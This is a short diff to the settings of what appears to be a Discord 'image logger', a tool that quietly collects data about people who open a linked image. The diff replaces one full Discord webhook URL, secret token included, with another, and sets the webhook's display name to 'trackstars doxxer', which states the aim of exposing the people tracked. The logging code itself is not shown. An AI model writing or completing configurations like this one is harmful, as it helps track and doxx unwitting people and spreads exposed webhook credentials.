@@ -12,13 +12,13 @@ __author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1400623234642346014/jFf2ookNMntSQGs9xdWRfkjw_ECd_UXF81Gup4lgEHSY6XTykIIZpHv9ezWq4LOuCtJR",
+    "webhook": "https://ptb.discord.com/api/webhooks/1401745667403284600/fof8o-KR-7hYDsj-evrl6d2tbo-4XPm_mnwz8PXMeO7sEbAWZ0gricBUh3PXvhr4yh3Y",
     "image": "https://cdn.discordapp.com/attachments/1400623192699175056/1400624327698939914/R_1.jpg?ex=688d508e&is=688bff0e&hm=dfb9b89f0e70209eb94e56b9166df63f8e19e49b161c9b69c607a7e3f5e558d1&", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "...", # Set this to the name you want the webhook to have
+    "username": "trackstars doxxer", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
